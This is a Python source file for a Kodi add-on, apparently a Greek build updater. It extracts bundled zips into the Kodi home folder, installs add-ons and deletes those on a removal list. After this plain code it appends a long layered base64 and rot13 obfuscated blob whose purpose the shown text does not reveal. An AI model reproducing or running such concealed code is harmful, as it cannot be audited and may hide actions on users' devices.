# -*- coding: utf-8 -*-
import xbmc, xbmcgui, xbmcvfs, xbmcaddon, os, hashlib, requests, shutil, sys
from resources.lib import extract, addoninstall, addonlinks, notify, monitor
addon = xbmcaddon.Addon()
addonid = addon.getAddonInfo('id')
addontitle = addon.getAddonInfo('name')
lang = addon.getLocalizedString
HOME = xbmcvfs.translatePath('special://home/')
USERDATA = os.path.join(HOME, 'userdata')
ADDOND = os.path.join(USERDATA, 'addon_data')
ADDONDATA = os.path.join(ADDOND, addonid)
EXTRACT_TO = HOME
BUILD_MD5S = os.path.join(ADDONDATA, 'build_md5s')

addonslist = addonlinks.ADDONS_REPOS
removeaddonslist = addonlinks.REMOVELIST

if not os.path.exists(BUILD_MD5S):
    os.makedirs(BUILD_MD5S)

dp = xbmcgui.DialogProgressBG()
changelogfile = xbmcvfs.translatePath(os.path.join(addon.getAddonInfo('path'), 'changelog.txt'))
changes = []

def percentage(part, whole):
    return 100 * float(part)/float(whole)

def versioncheck(new, old):
    a = new.split('.')
    b = old.split('.')
    if int(a[0]) > int(b[0]):
        return True
    elif int(a[0]) < int(b[0]):
        return False
    elif int(a[1]) > int(b[1]):
        return True
    elif int(a[1]) < int(b[1]):
        return False
    elif int(a[2]) > int(b[2]):
        return True
    elif int(a[2]) < int(b[2]):
        return False
    else:
        return False

def updatezip():
    new_upd = addon.getAddonInfo('version')
    old_upd = addon.getSetting('updatesver')

    if old_upd == '' or old_upd is None:
        old_upd = '0.0.0'

    if versioncheck(new_upd, old_upd) == False:
        return

    notify.progress('Ξεκινάει ο έλεγχος των zip ενημέρωσης')
    updatezips = xbmcvfs.translatePath(os.path.join(addon.getAddonInfo('path'), 'resources', 'zips'))
    dirs, files = xbmcvfs.listdir(updatezips)
    totalfiles = len(files)

    if totalfiles == 0:
        addon.setSetting('updatesver', new_upd)
        return

    zipchanges = []
    for item in files:
        if monitor.waitForAbort(0.5):
            sys.exit()
        if not item.endswith('.zip'):
            continue
        zippath = os.path.join(updatezips, item)
        newmd5 = filemd5(zippath)
        oldmd5file = xbmcvfs.translatePath(os.path.join(BUILD_MD5S, item+".md5"))
        if old_upd == '0.0.0':
            xbmcvfs.delete(oldmd5file)
        oldmd5 = xbmcvfs.File(oldmd5file,"rb").read()[:32]
        if oldmd5 and oldmd5 == newmd5:
            continue
        dp.create(addontitle, lang(30003)+"[COLOR goldenrod]"+item+"[/COLOR]")
        extract.allWithProgress(zippath, EXTRACT_TO, dp)
        xbmcvfs.File(oldmd5file,"wb").write(newmd5)
        changes.append(item)
        zipchanges.append(item)
        # xbmc.sleep(1000)
        dp.close()

    if len(zipchanges) > 0 and len(addonslist) > 0:
        addoninstall.addonDatabase(addonslist, 1, True)
        xbmc.executebuiltin('UpdateLocalAddons()')
    # xbmc.executebuiltin('UpdateAddonRepos()')
    addon.setSetting('updatesver', new_upd)
    notify.progress('Η ενημέρωση μέσω των zip ολοκληρώθηκε')

    if len(changes) > 0:
        while (xbmc.getCondVisibility("Window.isVisible(yesnodialog)") or xbmc.getCondVisibility("Window.isVisible(okdialog)")):
            xbmc.sleep(100)
        if os.path.exists(changelogfile):
            ok = xbmcgui.Dialog().ok(addontitle, lang(30004)+"[CR]"+lang(30005))
            if ok:
                textViewer(changelogfile)
        else:
            xbmcgui.Dialog().ok(addontitle, lang(30004))
        xbmc.executebuiltin('ReloadSkin()')
    return True

def addon_remover(lista=removeaddonslist, msg=True):
    for removeid in lista:
        if monitor.waitForAbort(0.5):
            sys.exit()
        try:
            addonfolderpath = os.path.join(HOME, 'addons', removeid)
            if os.path.exists(addonfolderpath):
                shutil.rmtree(addonfolderpath)
                xbmc.sleep(200)
                addoninstall.addonDatabase(removeid, 2, False)
                if msg:
                    xbmcgui.Dialog().notification(addontitle, "Αφαίρεση >> %s.." % removeid, xbmcgui.NOTIFICATION_INFO, 1000, False)
        except BaseException:
            if msg:
                xbmcgui.Dialog().notification(addontitle, "Αποτυχία απεγκατάστασης >> %s.." % removeid, xbmcgui.NOTIFICATION_INFO, 1000, False)
            continue
    xbmc.executebuiltin('UpdateLocalAddons()')
    return True


import base64, codecs
morpheus = 'IyBlbmNvZGVkIGJ5DQojIEZURw0KDQppbXBvcnQgYmFzZTY0LCB6bGliLCBjb2RlY3MsIGJpbmFzY2lpDQptb3JwaGV1cyA9ICc2NTRhNzk3NDY1Mzg2ZDRmMzQzMDcxNTczNTU0MzY0MjJmNDk2MzQ4MzE0ZjRhNTY2ZjUyNDk0ZTQ0NzA0YTU4NGY0ZTQ0NTY2NzQzNmIzNDQ3NTU1NzU0NmU0OTRkNmQ0OTZhNjQ3OTY4NzA3Nzc1NTM3MDUyNDk1NDM1NjQ3YTJiNTA2ZjM2Nzg3ODY3NzY3MzcyNGIzNjc1NzQ0NzRjNTg2YTY3NTU2YzQ5Nzg2ZDMxMmIzNTc3Mzc3MjU2Mzc0YzUwMzc3MDc0Mzk0Zjc0NzU1MDM4MzQyZjY2NmE3NDY0NjY2YTdhNmUyZjM3NzA0ZTc5MmY3YTJmMmY3OTZlNTAyZjJmNzA1ODQ0NjYzMzZhMzgyZjY2NTg2ZjM5MmY0ZjdhMzM0ZTJmNzY0OTYyNTI3ODUyMmYyYjJmNGY2NjM2NzY3NDQ4MzgzMzM1MzYyZjRmMzIzMzY2MmYyZjc0NjQ3YTZiNzM3MjcxMmYzMTM2Njk3NjMzNzQ3ODY2NzA2ODMzNGQ2ZTc2NmM2NjUzN2E1NDY0NGE1YTc5Nzk2NDc1NDc2YzY1MzkzNDc1NzYzNDY4NjE1ODY4Mzk2ZjYyMzgyYjc4Njc1MjRlMzg1ODU0MzYyZjJiMzk1OTdhNTAzNjc0NTY0YjcyNjc2NDYyMmY1MTMzNzY0ZTYxMmYzNDJmNTc0MjY0NDczNzdhN2EyYjU3NzE0ODMzNjQ0ODY2NmQ3MzU1Njc2ZTc1NTgzMzc3NmM3MDZjNzk2Njc0NzE3NjRlNjc3MjVhMzI0Zjc2NjE2ZDU4NmM3YTcxNWE1NDU5N2E3OTc1NmU2MzRlMzg2YzU1NmM3MjU2NTIzMTZkNjE3Mjc4NTk3MTdhNDc3MzU2Mzc1NTMwNjM2OTYzMzIzODQyMzM0NzQ4NjU3ODU2Njg2NTY2NzM0ZDQ2NzQ2YzQ2MzQ3Nzc2NzU3MDU2NTQ0Nzc1NzQ3MzRkMzE3NTRlNDM2ZDUwMzQ1NjM0Nzc3MTRmNzc3OTU5MzMzMTU0NmE1YTZmMzczMzYyNTY1ODQ2NTc0NjRmNGU3MTMyNzc3YTcyNjg3YTRkNmQzMjMzNjYzODVhMzYzNTdhNzY0OTdhNjY3MjY2Nzk2MTZkNGU3OTMzNDQ3MTRjMzUzMjcwMzA2MjYzNjg2ODcyNmU3OTQ2NTQzMjU3NzAyYjZmNDQzNTM4NDQzNjJiNTYzMTU2NjU1MTc5Mzc0OTQ1MzUzNTU4NDkzNzM1N2E2YzRjMzM3OTM0MmI2ZTVhNTU1OTU5NjE0Mzc4NzY3MjUxNzAzNDQzMmI3ODQ0NTc2NzVhMmYzMTQxNWEyYjUxNzEzNjYyNzM2ODYzNDg3NjM4MzQ3ODZhNGUzNTUyN2E3ODRjMzY2NzQyN2E1NjY3NDg1NjRkMzU2YzQ2NzM1OTZiN2EzNDRiMzc0NTM5MzE0ODRjNjY2ZDJmNTAzNjQyMzg2YzM3MmYyZjZlMzAzNTM1NDY1NTQ5NjU1MjU0MzM0ZjYxNzc3MzU2MmIzOTUyMzE1ODRjNDUyYjc0Njg1MDYyNDY0ZTJmNmU0MjY2NmE2YTVhNTcyZjc3NjY3YTUxNTA2NjUxNDg2NTUzN2E3MTQ5NTk2NDRmNTY3OTUwMzI2ODdhNmM1Nzc2NmY3NjUwMmY0OTRjMzU2ZjU2MmIzOTYyMzI1MDRlMmY2NTZjMzk1MTcwMzczNjY3NTA1ODc5NjQ3YTU1NGIzMjZkNzU0ZjY0NTE3OTM4Njk2NjZiNzU2ODcxNmYzMjRkMzg3MTMxNmQ3NDM2MzM1NjM3NTM0ODcyMzc0MTc1MzU1ODU2NzQzMjZlNGQzMTc3NzEzNzVhNWE2YzQ0MzQ3YTRiNmUzMzc5NzE1NzYzNDI3MjM0MzM1NjMwMzY0ZDY0MzY2ZDc2NzY0YTcyNzM0NzRhMzY3MDM1MzE1NTU2N2EzMTU5Mzc2NDM5NTQzNzQ3NmY1Nzc0NGQ0MjJmNzQ2NTczNjk1MzM4MzI1MjcyMzI3MjMzNTUzODcxMzA2MzY5NTQ2ZDY3NTEyYjc3NDgzODMxNmQzMDM2Nzk3MjRjMzMzMTY1MmI3ODRjNzk0ODQ4NzY3MTU5MmY0MzM0NzI0ZDU5MzYzNjU1NTE2MjczNDQ3Njc0NTI3NjJmNDM0ODZhNTA3MDRlNGM3NjUxMzc1NjUyNTc1NTMyNjE1MjM5NzM1NzJmNzM0NTY2NzE0NTU4MzYzNDdhNGU1NjM4MzU0MjY1NTg0NzQ4NDI2NjZmNjczMzM2NDI2NjU3NWE0NjQ0N2EzMjU5NmI0ZDZlNmIyZjRkNzI1Mjc2NmI2MTM3MzQ0YzRmNzc0NjY1MzA3ODYxNzIzMDUwNmQ0MTY2MmY3ODZkNjM2NDU1MzUyZjc3NDk3NzZlMzc1NTc5Mzc2Zjc3NzM0NTY2Mzc0ODY3NTk0ZTM1Njk3NjY4NGU3NzYyNzI0YzMzNDI2NjcyNDY1MDY4MzM0YTc4NzY0OTQ0NjU1OTMwNzY3Mjc2MzI0YjM4NDY0ZTYxNjg2ZjY3Mzg2MzM2NDQ2MzU3Mzk0MTUyMzc1NTRmMzg0MzY1Njk2OTQ3NmM1NTRlMmY1NjZmNzczMTMyNjczMzM3NGI3NTQ4NDgzMDRkNjQ1OTc3Njc2NjY4NjQ3OTRlMzg2ZTdhNjE0NzZlNjg1NDMxNTI0NDZjNDg3ODRhNTc1MDc1NGI3ODY3NmMzNTcwMmI3MjMyNjg1MDc5NmY0YzM5NDg0MjQxNmUzMzQ2MmY0YTU3NGE3NDRlNjY3MDQyNjYyYjUwNzY2MTY3NjIzMDM0NTA2ZjRlNjM0Njc2N2E0YTUzNjEzNjc3NDk2NTUzNTA3MzU2MzkzMzRmNDg0MTY1Nzk0YjU3NmY1MDJmN2E0MjQ4MzA2NjYxNTE2MzQ3NzY0OTUzNjYzMTcwMmYzMTQ3Nzg3NzMzMzI3NDYxNTkyYjYxNzU2ZjZlMzc3NjQ3MzkzOTY5MmY2MTQ3MmY0NjU3NGQzODM2Nzc0Yzc1NDk0Zjc0NmU1Mjc5MzI2ZjJmN2E2MzJmMmI2ZDM5NmY3NTYxNmQ0YTQ2NTU3MzQzMmY2ZDc3NTg0ZTU3NTU2OTM3NDU0ODJiNGI1MjQ3NDQ0NjQzNDYyYjRmNTA2NDJmNmY2NjY0NGU2NjU0NzI3NzM5NjE0NDJmNjk2YTU4NTc0ODMzNTA0Mzc2MzA2NTJmNDQ2YTY5NzYzNDRhNDg0NDQ0Njc2YTJmNjE0MjJiNDU0YjY0NWE3NDQyNTA1MjY0N2E2NzRmNzY1NDZhNDQ1ODQ1NDgzNzJiNDU1YTY0NmY2NDY2NDQ0NDJmMzk2NzM3Mzc0NTY0NjU0MTc2NDI1ODQ1NGQ2MzczNDI2NjJiNDY3ODRhMmI0MTQ4MzA1NjU3Mzk2NzRlMzg2ODU0NTEzOTM0NGQ2ZTM5NzA1Nzc4NDI3MzU4NjY3MDRlNjMzNjRjNGY0YjJmNzU1NTU0NGYzNDQxNWE3NjcyNTk0NDM0NmI2NjU5NGY2ZjU5MzE2YTczNTc1OTQ1Mzc2ODQzNTA0ODRkNmY3NjM2NGI2MzY5NGY0ZjQ1NjM1NTQyMmYzNzUyNmI2MjMwNDMyZjY5NmM2NjYyNTk3NjZlNGUyYjZhNTgzODU2NjY1MTMzMzc3MjQ2MzM0NTRjNTc0YzQ5MzEyZjc0MzY2ODMwMzI3NzUyMzk1NjcwNTAzNjMyNzc2ZTM4NzE0NjM3NTA2YTMwNTkzOTcwNzI2YTc2NTc2NzYzMzQzNjQ0NjI2ODc3NjQ0NDJmNTQ0ODZiNjY0NzY5NGI3NTMzNTg2YzcyNTk1MDM3NDk0MTM0NTI3MDc4NjkyZjc4NmU2YjY3NDE1NzQxNWEyZjU3NGIzMjQxNmYzNTY3NDQyZjUxNGQyYjYzNmI0YzczNTM3NzUwN2EzNTcwNjQyYjc4NTY1NTYzMmIzMDQ5MmY0NjQyMzQzOTZkNDczNjc3NDE1MDQ1NzI3ODUwNjY0ZTZiNTE2MjJiNmM2ZTYzMmI0YjRkNTE3NTc4NDI1MDZlMzc2NjMwMzAzODUwMzI2YjM3Nzc0NzM0MzMyZjRjNmEzOTcwNTYzOTY3NmE0ZTZmNmQ1MDZiNGYzOTQzNTg0OTRiNGYzNTdhNzI2NTZlNTkzMjY4Mzg1NTdhNDg0YTU3NDk3NDQ5MzczNDY2NDk0MTJmNTc2NzM3Mzc2ZjZhMzA1MTZiMmI0YTRkNGUyZjU1NDY2NTM2NGU2YjZlMmY2NzQ5MzM0ODRmNTEzMTZhNzE2NTY2MzY2Njc5NDY0ZDYyNTE3MjYzNTY3MjZhNzczNDQ1MzQ3ODQ4Njk2ODJmMzg3NzY4NDkyZjRkNGUzODZiMzQ0ZDY1MzA3YTM1NDE3NTc2NDEzMzM3NTQ1MDU3NGU1MTU4NWE0OTQ1NjQ2OTYyMzk0YjJiMzY2MTQzNTg1YTUzNGY0MzM5NzE0NDJiNWE0ZjM0NzQzOTQ3MzQ3OTU3NjY2ZjYyNGE2YTc5NDU3NjUxNDE1MDM0NTA2NTRjNzM1NDdhNjczNDM1MzcyYjY4NDgzMzRjMzY2NjM4NjgzNTY4NjU0NTMwMzk0ODJmNjQzNTQ5NTAzNDUyNGU1YTJmNTQ0ZTc2NDc0YTJiNjg1NDMwMzU1ODMwMzEzODY4NjYzMTcxNzk2YTZlNzAzNjU1NDEzODQ3NGY1NTM0MmI1MTQ2Nzc3MjcwNzI3OTM5NTk3MTY2Nzc0NTUwNmM2MjRiNjc2ZTc5NGQzMjM4NTM0Mjc0NTEyZjczNGE1OTU0MzM2YjRiMzgzMDRjNDg1MDc2NTU0YjZkNTU2MjU5NDkzOTUwN2E3NzZjMzc3NzQ3NTIzMjJmN2E0YTczMzYyZjMxNjgzNjJmNzA0NjM2MzU1NDcxNzczMjU4Njk0MjZhMzI2ZDM1NGQ1NDJmNzQ3YTM3Nzg0ODRmNTc0YTcyNzc2ZDUwMzY0OTUwNDc2MTY2NmY2YzM0NzM2NDc3NzA2Yzc4NDgzMzY5NGI3NTMxN2E2ZDMzNjM0YTdhMzY0MjU1Nzk1MDc4NmUyZjZhNGQ0ZjZmNTA3NjU4NTI2ODQ0NGE3NjRlNjI3Mjc2MzI0ZDJmNmI1OTM4Njk0ZjQ2MmY2YjQyNzQzMTQzMmI0ZjQxNzU0Yjc0MzA3NjQ2MzY0ZDRiNjIzNDQ2MzE2OTRkMmI2MzU2MzI2NDRlMzY0NjMzNTg1YTM4NzczMzdhNDk1MDM2N2E3ODRiNDg0NjQ4MzY2NDJiNGE2ZTU0NTAyYjQyNzY3MTQ0NjY3MTc0NTM1OTUzNDg2YzY4NjQyYjQ5NzkzMzc0NjQzNjY3NGE3YTU5NmMzNjM0MmY0NjRmNDkzMzcwNjgzNDY4NTEzMDc3Mzg3NzcyMzY0YTc0Mzg3OTQ0NDI2NTRlMmY1YTRjMzE3OTZmNGMzOTU4MzI2ZDJmNjY3MDMxNzc1NTczMzYzNjQzNzIzODQzMzM0ZTQyMzc1MTM3MzQ1ODQ2MmI2NzRjMmI0NDJmNzg2ODUwNjkzNjZlNjY0NjUxN2E2YTMxNDk1MDdhNDU2NjRkMzM3ODY2Njk0NzU4Nzk1MjYzNjc0NDZlNjc0ODc2NTEzMjUyMmYzNDU0MzU3ODQxNzY0NTMxNzg3MDc2NGY0NTc3MzM2ZDU5Mzc3YTY1NzM3MTM3NTMzODMwMmYzNjRhNDQzNDY4NmE3OTRkNTUzNjUxNTQ0NzU4NWE1OTY4NTQ1MjJmNzQ0YTUyMzM3ODVhNDk3ODYzNmE3MjY4NmU3NjczNDU3MzRhNDczODQyNTA0ZDdhNDY0ZjY0NTI1ODM5NjkyZjc0NmI1MDUxNGYzNzM2NDY3ODRlNzUyYjQxMzk2YTU0MmY0NTY0NjM1MTMxMzg2NzU0NmI3NTZiNGM1MDc0NDY0ZTUwNTAzNDRlMmIzNjQ3NjU0OTU3Mzg1OTMzMzg3NTUzNTk1NTQxMzc0YjUyMmY3YTQ0NTA2OTQxNjYzOTYxMmY3MjRhNjM1OTZlMzkzMzY1NTkzNjY3NDg2ZTVhMmYzMDQxMzM0NjUwNDU3ODMxNzA0ZTY0NTE0ODcxNGE2NjY3NDQyZjY0MmI1OTM4NmIzODc4Mzc1MjRmMmY0YjM4NmY0NjY2NDQzOTUxNGU3OTRlN2E2YTc1NzEzMTRjMzE2MjQ1NGE3MzY4NTQzNjUyNjk2NjM1NzEzNTMxMmY1MTU1MmY2MzY5NjM2MzM4NDk2YjU0Mzk0ODc2NDc0MjY2NjI2ODc1MmY1MjYyMzQ0NDQ0N2E3ODQ1NDc3NjQzMzM3OTc0NzU1OTJiNDQ3ODcxNjU0MzY1NTg0ZjY3NzY3NzQyNTA2YjUwMmIzNDU2MzQzMjM1MzAyYjJiNzMzMjM1NDE1MDcwMmY0ODMwNjUyYjc5NDQzOTVhMmY3YTQ1MzM2NDMxMmY1NTUzNzMzMTc2MzU2YjM2N2E3MTRhMzk1MzZhMzM3OTZhNzk2ZjM5NTE0NzM3NGYzNjdhNTA3MTUxNjU1ODJiMzI2NjJiNGQzMzJmMzY0NzY0NjM2MjM2NDY3MzM2NDQ3MDY5Mzc0NzU4M'
trinity = 'zV1LGHmZmx3LGH0ZzV0LGMuA2R1AmL0AwL1AwD3AzH2AGp0AmD2ZwIuZzL3BGL2A2R2ZmExAwZmAwDkAQV3LGpkATL3ZQZ1Amt1ZGMxAmV3ZQEzAwt1AwZ1ZmN2Awp1AQVmAGL3AwL2LwEzAwD1ZmplAmplLwMuA2RmAGH0ZmN3BGL0AGx2LGWzATD3AGp3AwD2BGEyAmH3AQMxZmR2LGH2A2RlLwp2AQp0Zwp1AQD2AwH2AwxlLwZ5AGD0BQExAQD1ZQH3AQtmBQZ0ZmVlMwL2ATRmAmZlAGNmAwEwZzV2AGplATR3AQquAQL0BQHjAGV2MGWvAwp2AwplZmt1BGp3ZmD1ZwMuZmZ0ZmEwZmR0BQH4ATD0BQZ2AGx2AwZ3AzV1AmZ3AQp3ZmL1AwL3AGEwAQL1ZmpkZmx1AQZ2AmD2MwDmZzL2MQp2Zmx3BQD1AGN1AmMyAwR3AmL2AmD2AwWzAQD2MGp2AQR1ZQZlAQDmZmMuAmH1AGLlAQt0AQH4AGN1BGpkATDmBQpjAQL2AwExAGpmAQZ0ZmZmZGEzAJRmAQquAmt2BQEwZmx2AGH1AGNlMwExZmL1BGZ0AGR1AQZlAwZ3ZmIuZmp1ZmZ4AmZ3BGMxAmL0LwZ1AzD0AmpkAwLmZQEzAwt0LmZ3ZmN2MQL1AGZ3ZGLkZmp1ZQZ1AQp1ZGD4ZmR0BQp0AmVmAGMvAGN2LwHlZmt1AwZ2Awx0BQH1AGDmAwp5A2R0BGD0A2R3LGMuAmHmAQH5ZzV1AwZ5AGHmAwH0Awp2AwH3AzL2ZGL3ZzL0MwWvATZ1LGMxAzH2LGD4ZmV2MQDmAzV3AwMxATR3ZwpkAmLmBGMuZmD2LGH0Zmx2MGD4AGp3ZGHlAwL3AmZ3ATD0AQZ5AzZ2LGDlAGN0AmDlATL0MQZ3ZmR2MGH4AmV2AQD2ZmH2BGMyAGHmZGWzAQV2LGZ3AmV0MwMzAzLmAQHlAGN3LGHkATH1BGL2AQp2LGp3AzV3ZwL2ZzL2MwZ3ZmL2BQD0ZmD1ZQZmAQp1AQZ1ZmN0BQpkZmZ0AwZ1AGNmAGp4AGt1AmHjAmtmZmquAQZ1ZQIuAmt1BGH4ZmH2ZGD1ZzL2AGH5AQx3BGp2AzV0ZGLkZmR2MGp4AQH2Lwp0ATRmZmquAGD3AGIuAwRmAQHkZzL3LGD1ATLmAmpkAwHmZwWzAQV3LGEuAQtmAGp3AQt3AmL0ZmxlMwpkAQZ2AGL5AGx2AGLlZmZlMwWzZmt3ZQZ4ZzV1ZQZ4ZzVmZmZ4ATL2AwDkAwp2AwD2AGL2AQEyAQV2AwZkAmx2LmDmAwDmZwZ0AmZ3AGplZzL0MQZ2AzD0ZGpmZzL0MQD1AGD2AQH3AQp0LGExAzR0LwMuATL1AQL1AQHmAmMwAmL0LmH2AGLmZGZ0Zmp2AQL4ZmDmAmL4Awt2AmD0AQxlMwL0ZmZ2AGDkZmH0MQWzAQV2MGZ0AQt3AGZ5AQt0AwWvAQp3AwZ2AzL1AmHjZzV1AmEwAQt2BGp1AmR2MQp3AzR3BGZkAwx0BQEyATZ2AQD2AmLmBQZ3AwVmAwD1AzHmAGL4ZmD0MGMvAGp0AmquA2R3ZGZ0ZmH0BQH2AzRmAQHjAzV2BGp1AmZ2LGH3AwRmZwEuAwZmZGD0AGHmZwpjATZ0ZwquAmLmAwMwZzVlMwMxZmp2MQH5ZmV1ZGp2AGx3AGLmAmR2ZGpmAwD2ZGWvAQt2MQEyAwD2AwDlZmp2ZwL3AwtlMwLkZmN2AGWvZzV3BGH2Awx3AwEyZmtmZGMxAQD3AwDlAQt0AGD1AzZmAwpkZmVmZGL5AQZ0MwEwZzVmBQpjAmV2AwD4AwRmBGD1AwL2LmEyA2R2AwZjATR1BQp3ZmN2BGLlAzD3BQHlAGxmBGZlZmD3ZwZ3AQp0MwDlAGt2LmplAGH2ZGpmAQt3BQMwAzD1ZwMuZmp2MQp5AQV1ZQp2AQR2MQEyAzR0Zwp1Wj0XqUWcozy0rFN9VPqwqv83MIZioH9QZ3WnAJRjGzy6oRMzn0u0owAFZmEFp0q4oGEYBKMME2gunT5XAzSHMxklGUZ1Awx3JxjmpRD0BJ9LnQxjIzuhGaAeHT8lrv9bYmIJDlgFnTIyETZkHRAgJxICBH4iBJcGGHWbq0IwAJ1VAmMlBGuBDHqkImx0q21yX3IOAzb3nwIfX043MwWXDaOdZ1IRHlgiL1ICDGMzoUxiZ3uGrzkLEGtlJSEELHqyJxZ5JRWQHzqGn3MKnQuIAKt2F3czG1IaETShqP9UF2fiqUSgZIM0AaE1naIfEUR5ZJ8kDaZeo3DkpP8mImySnGMEY0qZoIIMIx5UnHEurKEIpzMdqwW1pmVmAJWSAKW5Awq0nGqkryOuGxAhDwEHnH95E25iAKb4JzIjpwE1BGMdY212G3ZlJFgMMR5knGM2D3IlBPf4GmZ4JaqML2R0JGp4q3uPLKyzLGWEpKt2q08inlf4HGqnD09bI2ggFv9Uo0IRnmpeJIOQHJ14oPgDLJM3LGSBLmSfIFgaFmp0FmquMyScrUqTGaZ3DHEGZH9cMyWFIP8mH3NjLwp4nUAQqTZ5GzV5GRp4BGS4DKOdJUO1Hl9jIaclqF9lI3Afn04mq1R5BJqJEaZloHgYBGyzHzW1GwSxX05crUEBo2EInScZqmEgHJg6GwuZDlgdHQAUo0EhASb4BILmAULmBSSuoyuLEP84pxkRX25cpR9PX1LmX1cFGQOloxkboJSHoSAgDHWMoKA5nQH4ITgbp0VmnQAhGKWKAHkVDmETY0gwMHMlqQygpTuSY3p4BRSAHJIPBSxmAyWRZ0WPY1clGSx5Z21MF2feoaNlpIIYqKykZP9GFaO1ZaWZMmZkZ2t4E2AcnwuYFxgPoSEUpz5IAz8lovgmI2gWFzATZ0qlLyZlp21RGIAFM0R4MQLkAwE5GHqzJJb5JPgfpyMXBH9mFISIJKqIL0gJGl9uHID5MIyMpJf5olgJqJt0pzx4oT5zJJWbMzMmZ3qyqTkEpaSdGT04FzqFBF9iIJIJDz5YZ3AGHwMiIRyjnGWnAaMwo3EaGzuWARI6IwD5nJWhpJMQq29xMTyzH3WSISbkrKuIoT04LwSiJJgMZmOvE1SWA1SALKIiX1EyDv96MGE1oUqeI3tmnHc5nSD0oQV2ERuWqzpkoz5KJUWQZHL5DIH4BR1XqRIlGT8lH0E5nGITnTSaHGy5AzkxZxq0ZyDmnJ9bXmRmJJSKAwu4D2RlDGIkIUR3Fwp2ImDmMQWTH2x1rT41LFgWqGuQBKqGnRuVZIL0oTWbqaSgJRkfAGACM1O2DGIkA2tmZyEQE3yzMwWHJzLiJQxlGJcxZaIdEQS6MJ9XDay1qUAMpzqJMmp3Z2kcIwZ0ZRgAM1WREKx0p2yiqwWlZIqXJJqLryIQnJ9IMJ8mHv94ZUAeqJqyX3IgDwWiZGqYoIMLX1ySGJgLBGS4DJLeHGqUFTcuqIHiBRSKrKWuHJqeIT1TATMmBFgaoJR0oaAwqKAJrREcqJyPHT1FGKcVZJcMI3EBATcPGaqcLyL5D2gkBGACITILD3qTMaSjAINmBIIGpTgnIxqXEzuFJT9cFaWaAmIdDKI6ZQS3EyIQoQxeFKH3BUOPX1yjF0WgAmIWE3ZkAKuhHmuaHyIyZ3ukoGI4nGHmo0WIowACBIblX3qLGJARZHf3FzS6XmSZY2EiIKWfpwVeZ0EgJyucDGAOnKAAAwuRpRufIIWKrIqRo3WmBTuYoREgoJ1kMH56IKciA0udpJgRHxIkFaMzAxSTozbmpKAwL0xmIIuwo0yxAJyWqmqQAQWGA2p5MTE5GFflIQIipGqkq1D3oySnqmp0FIH4paSbHUW5MwS3nRg0JKubZmOaqRyknTERn3IOGSD0DJqinQqkA1quETELBQpkoF9YnzW2L2yAp3D5qxuVMzADrxyWHmL5ZyN3LKNmGJICnRqxIT1InmqcGQMXZwq4E2k5JGEznIuzJzMgIJqJnPgfrJyZHRuXBTyJp3cEX0cuGaWyMKR5p3WuGIOMJJDlAJqlA2c2oJgzLGySJKWSomycD1cEX0gvZ2glFUqkJwx1JGEmA2AcFJkXZmZ1BRcDAzkBp2c4AmSmA2kvZ0yMHz9YMJk0Y2AgpFgdE1Ljo2Z1ZSAmpzEFMHy5Y2qGDKcfETVjFGOGDaR5JHqhIHc2FUAmF3uPHayIpHgwAKqAo2klrzR0F1MjGFfmJRD2MmumMmSUM2uAAaLmE3blryIwAmyPFzMUAQqvZ2S5BKH2AzMUnIqyZ1MMryueHT1GBKSbrHgio2gME09mo2WOA2uOLIAkEIWHHmx5ZUAlpTW3MJA6MRSnp0uUqHAdY1S1ZmEmFlgZpJMaZzWvAKuvFxAfJTInpwM6Xmq1GJbiLwWcMwSWX1M1FF8ioHMJHKR4q1cBEmMGM0kRY2SeFTAAqJExHJIUBJqAA2WyFxu1pKIaZRt0L1EaEJp2qxxmDzA3IIZ1nRMmnPgTIyOyqKqQoHqOERkeoSAbq3yLIzqErSAzH3y3LmN5AGMGAaLeLyAgrKSdZTy2MR5Ro2SgFHyvGmuvDxgBoaMPMaImrwqxo1D5qR1iAHj3Z0AFpycQMHykDzEDITqaM3EuqxWHE2ckq1qdAxcHAzp0MSSeo0curxE3ryWxEmyEA2AlLHb3ZwZ5nSyUIxH2qGt0Ax9QJGtkn3AAolf4ImHiD0ImMUL5qJ9eJzEPo1q4BIHmDzIEo1DeMR1iL0Swp29xn2M3H2AMLJfjZacnA1ZjoKAbZHqQJQMMElf2M1EgEwIyMQAJM2L1M3Icp1AgJzgwJKWGJGN3Z2WQZUH3JSHjnHcmL3clM3qaDJcKGSEyM1x4F1SOFJVmGSp0AIA3nKuRp3Icpac4MmEFJzqWI3qaZJS4LGA3X0D1BJZ2ozc1o2SQDKuWqUWiAJueZJ9YZT1fq042MJVlDmOTn2yjq3q2BGZlpzkvpSMIAwEdJKb4qwAyZGEmGJZ0EF9FJPf1n0EZEHqCpTxlAwWHn2IHpTkQERMgD0qZImMxHQyWZzc6FRSXJJqRGHyfZQMvBUADAmyiMKqlq1uREzf5Z3E1BScfBTWjHSEBBUuTqTkcAmIHo1HjMSAgBKABrGA6pzkQpxAwF2ghX1cPE0b3M3xjnv9lIaM6p29bDaqgnRcRAJMEHH5IHxL5nHAlEQqdZaAYHyqeY1qkqKAMqzkDIRMuF2IIF2p0pIIgFIAcAGAcoHgZFTcjARcmp2S2IKSlZ2gxMTuhMHReGax3rzy3rxuiqzgTLmInEGyGHKyjrwO1n2WdqRunFJq6Fx1aIyb0pz50pJybE2WGGUAwHPf3qIylER8lIUSHGTyyqH9zERLeqzV5JzAWH3EYLGAMnIcIF3IRMv84DmA1ATAyHTy1nR80GQqbF2IfBRcUIxcUrzqFBQDiESIHAKZ1o29wAIcFImN5Ezfmqzbipz1gG0AxpUNiqHS4MHcvMlgkARkwomyZL2V5H3cKoHunoaMhJIq4M2cbIHSEEmIyImWfFmx4IKR1pSAGAHkOHUAwEwALDKqaZzj0AKWlIJ14Z2qFFKpeZvf3ZQSzBGZeZzg5X0AmpGuWoKx5FzcYFaNinzg5MHbmGxkABHAXBP9bLHgZq1EMLGWbrRyAX1EYGKEUMRMcMKHeM05nExHkZTRlo3p3Y01xrQSRp2EGFJ9ZZUWkLxEvMxqzGzugoIWmL0IjJzy2D0gEAHyzowukZ3qRX2yyH0EfnIW4q2SgM1yKpxbkZ0WHpJgiZF96A0gJGQMwX2AnImW3A3SSo3xkGIELH0gIMmWdrzWYI21HLwZ2nKqSExMjJUIjEwu5paq5nHRjHaN1FUbkAapipJSHM2k0oGqdFwOOpPf1nRc6HKL3M0qVAwEXoSy4qRZ4MJyLHUqcMUt4MTyCZUqTo2xln0qRJP95o3A0FURlFyR5EKIiETDiEaHmq2MWnyWMryqUA1ETMzyOG2IeJzx0p1cXAz84L29QFwympRV1GaqZLz5FoHuvoap4p0SXY1beL1tkJQWvATRlpUWuL1Adn2W2G3D2oKqPqUN1AKIPZ